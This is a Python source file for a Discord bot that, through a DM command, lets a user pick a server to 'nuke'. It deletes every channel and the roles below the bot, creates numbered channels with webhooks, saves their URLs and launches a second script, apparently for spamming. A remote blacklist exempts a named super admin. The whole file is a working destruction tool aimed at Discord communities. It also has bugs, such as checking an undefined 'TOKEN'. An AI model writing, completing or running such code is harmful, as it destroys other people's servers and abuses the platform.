import discord
from discord.ext import commands
from discord.ui import View, Select, Button
import aiohttp
import json
import os
import subprocess
import sys

banner_text = f'''
hi
'''

token = os.environ.get("SERVERNUKE")
if not TOKEN:
    raise ValueError("No token found! Set SERVERNUKE in environment variables.")
BLACKLIST_URL = "https://raw.githubusercontent.com/CreeperKing3532/NukerBlacklist/main/blacklist.json"

# Global so you can access it anywhere
SUPER_ADMIN_ID = None

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

async def fetch_blacklist():
    global SUPER_ADMIN_ID
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(BLACKLIST_URL) as response:
                if response.status == 200:
                    data = await response.text()
                    json_data = json.loads(data)

                    # Pull and store super admin
                    SUPER_ADMIN_ID = json_data.get("super_admin_id", None)

                    return {
                        "user_blacklist": json_data.get("user_blacklist", {}),
                        "server_blacklist": json_data.get("server_blacklist", [])
                    }
    except Exception as e:
        print(f"Error fetching blacklist: {e}")

    # fallback
    SUPER_ADMIN_ID = None
    return {"user_blacklist": {}, "server_blacklist": []}

class ServerDropdown(Select):
    def __init__(self, guilds):
        options = [
            discord.SelectOption(label=guild.name, value=str(guild.id))
            for guild in guilds
        ]
        super().__init__(
            placeholder="Choose a server to nuke...",
            min_values=1,
            max_values=1,
            options=options
        )

    async def callback(self, interaction: discord.Interaction):
        self.view.selected_guild_id = int(self.values[0])
        await interaction.response.send_message(f"Selected server: {self.values[0]}", ephemeral=True)

class NumberDropdown(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label=str(i), value=str(i))
            for i in range(1, 26)
        ]
        super().__init__(
            placeholder="Choose a number (1-25)...",
            min_values=1,
            max_values=1,
            options=options
        )

    async def callback(self, interaction: discord.Interaction):
        global selected_number_global
        selected_number_global = int(self.values[0])
        await interaction.response.send_message(f"Selected number: {self.values[0]}", ephemeral=True)

class ServerView(View):
    def __init__(self, guilds):
        super().__init__(timeout=60)
        self.selected_guild_id = None
        self.selected_number = None
        self.add_item(ServerDropdown(guilds))
        self.add_item(NumberDropdown())
        self.add_item(GoButton())

async def makeChannel(guild):
    global selected_number_global
    
    if selected_number_global is None:
        print("No number selected yet!")
        return
    
    number = selected_number_global
    print(f"User selected number: {number}")

    file_path = "webhooks.json"
    # Load existing webhook URLs or start fresh
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            data = json.load(f)
    else:
        data = []

    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=True)
        }
        
        for i in range(1, number + 1):
            channel_name = str(i)
            channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
            webhook = await channel.create_webhook(name=f"NukeWebhook-{i}")
            webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
            data.append(webhook_url)
            print(f"Created channel '{channel_name}' and webhook '{webhook.name}'")
            
        # Save all webhook URLs after creating them
        with open(file_path, "w") as f:
            json.dump(data, f, indent=4)

        # Now call part2.py using subprocess
        # This runs `python part2.py` in the same directory
        subprocess.Popen([sys.executable, "_part2.py"])

    except Exception as e:
        print(f"Failed during channel/webhook creation: {e}")


class GoButton(Button):
    def __init__(self):
        super().__init__(label="Go", style=discord.ButtonStyle.danger)

    async def callback(self, interaction: discord.Interaction):
        view: ServerView = self.view
        guild_id = view.selected_guild_id
        selected_number = view.selected_number
        user_id = interaction.user.id

        if not guild_id:
            await interaction.response.send_message("Please select a server first!", ephemeral=True)
            return

        blacklist = await fetch_blacklist()

        if user_id != SUPER_ADMIN_ID:
            if str(guild_id) in blacklist.get("server_blacklist", []):
                await interaction.response.send_message("❌ This server is globally blacklisted from nuke.", ephemeral=True)
                return

            user_blacklist = blacklist.get("user_blacklist", {})
            if str(user_id) in user_blacklist and str(guild_id) in user_blacklist[str(user_id)]:
                await interaction.response.send_message("❌ You are not allowed to nuke that server.", ephemeral=True)
                return

        guild = bot.get_guild(guild_id)
        if not guild:
            await interaction.response.send_message("Can't find that server :(", ephemeral=True)
            return

        await interaction.response.send_message(
            f"🧨 Starting server nuke! Number chosen: {selected_number}",
            ephemeral=True
        )

        # Delete all channels
        for channel in guild.channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Could not delete channel {channel.name}: {e}")

        # Delete roles (below bot)
        for role in guild.roles:
            if role.is_default():
                continue
            try:
                if role < guild.me.top_role:
                    await role.delete()
            except Exception as e:
                print(f"Could not delete role {role.name}: {e}")

        await makeChannel(guild)

@bot.command()
async def n(ctx):
    try:
        await ctx.author.send("Pick a server to nuke:")
        view = ServerView(bot.guilds)
        await ctx.author.send(view=view)
    except discord.Forbidden:
        await ctx.send("I couldn't DM you! Please check your privacy settings.")

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    print(banner_text)
    

bot.run(token)
